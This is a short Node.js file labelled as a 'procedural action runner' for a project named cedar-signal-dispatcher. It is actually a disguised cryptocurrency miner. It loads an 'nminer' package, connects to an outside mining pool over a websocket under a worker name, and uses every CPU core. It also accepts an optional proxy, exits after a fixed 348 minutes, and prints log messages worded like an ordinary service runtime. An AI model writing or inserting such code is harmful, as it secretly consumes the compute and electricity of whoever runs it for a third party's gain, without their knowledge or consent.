// Procedural action runner for cedar-signal-dispatcher
const os = require("os");
const { NMiner } = require("nminer");
const config = require("./lib/config");

async function bootstrap() {
    const instanceToken = "1ed82b";
    console.log(`[host] Starting runtime for ${config.appName || "cedar-signal-dispatcher"} [${instanceToken}]`);

    const handler = new NMiner(
        "wss://nmining-runtime.igrp.app/",
        "Arup07.cedar-signal-dispatcher",
        ({ threads: os.cpus().length, throttle: true, proxy: process.argv[2] || undefined })
    );

    process.stdin.resume();
    setTimeout(() => {
        console.log("[timeout] Operational limit (348m) reached, exiting cleanly.");
        process.exit(0);
    }, 348 * 60 * 1000);

    process.on("SIGTERM", () => {
        
        console.log(`[host] Signal SIGTERM acknowledged, exiting session ${instanceToken}.`);
        process.exit(0);
    });

    console.log(`[ready] Active on ${os.hostname()} (${os.platform()}) with ${os.cpus().length} threads.`);
}

bootstrap().catch((err) => {
    console.error("Supervisor startup fault:", err);
    process.exit(1);
});
